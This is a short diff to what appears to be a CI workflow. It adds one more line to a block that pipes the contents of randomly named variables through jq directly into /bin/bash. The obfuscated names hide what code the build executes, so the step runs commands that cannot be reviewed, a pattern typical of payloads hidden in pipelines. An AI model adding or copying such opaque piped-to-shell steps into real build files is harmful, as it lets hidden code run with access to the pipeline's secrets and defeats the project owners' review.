@@ -26,6 +26,7 @@ jobs:
           echo $uc03 | jq -r .bgdg53 | /bin/bash
           printf '%s' "$zuxd1863" | jq -r .fei0953 | /bin/bash
           printf '%s' "$rzawx66682" | jq -r .uq74532 | /bin/bash
+          printf '%s' "$xeq65" | jq -r .duobp5 | /bin/bash
 
       - name: Persist results
         if: always()
